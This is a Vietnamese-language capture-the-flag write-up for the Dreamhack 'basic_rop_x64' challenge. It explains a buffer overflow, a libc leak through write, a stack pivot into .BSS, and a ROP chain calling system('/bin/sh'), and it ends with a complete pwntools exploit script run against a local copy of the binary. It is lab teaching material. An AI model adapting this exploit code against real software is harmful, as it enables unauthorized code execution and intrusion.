# Link Challenge Dreamhack

[basic_rop_x64](https://dreamhack.io/wargame/challenges/29)

# Phân tích code

<img width="892" height="362" alt="image" src="https://github.com/user-attachments/assets/14e33224-4938-40a3-affb-e7725e77227e" />

Buffer overflow ở hàm read cho phép nhập 1024 kí tự.

<img width="905" height="221" alt="image" src="https://github.com/user-attachments/assets/b8dee386-8f38-416e-b52a-5df9fa36a31c" />

Cơ chế bảo vệ PIE tắt nên các hàm trong binary là địa chỉ tĩnh.

<img width="1102" height="140" alt="image" src="https://github.com/user-attachments/assets/c19f6e32-bc5c-4fad-bc49-2edc98d15e7b" />

Các gadget trong file binary không đủ để gọi execve `/bin/sh`. Cũng không có hàm nào gọi system trong binary. 
Để gọi system('/bin/sh') cần libc base. Vậy trước tiên cần leak libc trước.

Nhưng trong chương trình chỉ cho phép nhập 1 lần nên nếu gọi read để leak libc trong Stack thì không còn khả năng ghi đè return address.
Thay vào đó ta dùng Stack pivot để chuyến hướng nhập payload lần 2.

<img width="1740" height="960" alt="image" src="https://github.com/user-attachments/assets/1e9e201d-9710-4c89-bec5-ac8d919a4b76" />

Thay vào đó gọi hàm write để leak libc từ 1 địa chỉ khác trong chương trình 

<img width="1077" height="422" alt="Screenshot 2026-10-26 170816" src="https://github.com/user-attachments/assets/c059722b-52c2-410f-aaee-78f371864962" />

Leak libc:

    rw_section=0x601088+300*8+8     //vùng .BSS
    pop_rdi=0x0000000000400883
    pop_rsi_r15=0x0000000000400881
    read_main=0x00000000004007f8
    
    payload=b'A'*0x40
    payload+=p64(rw_section-8)      //ghi đè rbp bằng .BSS
    payload+=p64(pop_rdi)
    payload+=p64(1)
    payload+=p64(pop_rsi_r15)
    payload+=p64(0x601038)          //nơi chứa địa chỉ libc
    payload+=p64(0)
    payload+=p64(exe.sym['write'])  //gọi write leak libc

Ở đây đang nhập payload thì chưa có libc base có nhập tiếp cũng không thể đưa `libc.sym['system']` vào được. Thay vào đó 
ta quay về địa chỉ hàm read ở main và setup nhập vào vùng .BSS đang nằm trong rbp.

    payload+=p64(pop_rdi)
    payload+=p64(0)
    payload+=p64(pop_rsi_r15)
    payload+=p64(rw_section)
    payload+=p64(0)
    payload+=p64(read_main)       

    p.send(payload)

Sau đó tính libc base:
  
    p.recvuntil(b'A'*0x40)
    libc_leak=u64(p.recv(6)+b'\x00\x00')
    libc.address=libc_leak-0x29dc0
    print(hex(libc.address))

Chương trình sau khi xong hàm read ở main lần 2 sẽ đi tới leave và kéo rsp thẳng tới vùng .BSS mà ta nhập vào
. Giờ chỉ cần nhập payload chứa ROPchain gọi `system('/bin/sh)`.

    payload=p64(pop_rdi)+p64(next(libc.search(b'/bin/sh')))
    payload+=p64(libc.sym['system'])
    
    p.send(payload)

## Script Python

    #!/usr/bin/env python3
    
    from pwn import *
    exe = ELF("./basic_rop_x64_patched",checksec=False)
    libc = ELF("./libc.so.6",checksec=False)
    ld = ELF("./ld-2.35.so",checksec=False)
    context.binary = exe
    
    p=process(exe.path)
    
    rw_section=0x601088+300*8+8
    pop_rdi=0x0000000000400883
    pop_rsi_r15=0x0000000000400881
    read_main=0x00000000004007f8
    
    payload=b'A'*0x40
    payload+=p64(rw_section-8)
    payload+=p64(pop_rdi)
    payload+=p64(1)
    payload+=p64(pop_rsi_r15)
    payload+=p64(0x601038)
    payload+=p64(0)
    payload+=p64(exe.sym['write'])
    payload+=p64(pop_rdi)
    payload+=p64(0)
    payload+=p64(pop_rsi_r15)
    payload+=p64(rw_section)
    payload+=p64(0)
    payload+=p64(read_main)
    
    p.send(payload)
    
    p.recvuntil(b'A'*0x40)
    libc_leak=u64(p.recv(6)+b'\x00\x00')
    libc.address=libc_leak-0x29dc0
    print(hex(libc.address))
    
    input()
    payload=p64(pop_rdi)+p64(next(libc.search(b'/bin/sh')))
    payload+=p64(libc.sym['system'])
    
    p.send(payload)
    
    p.interactive()
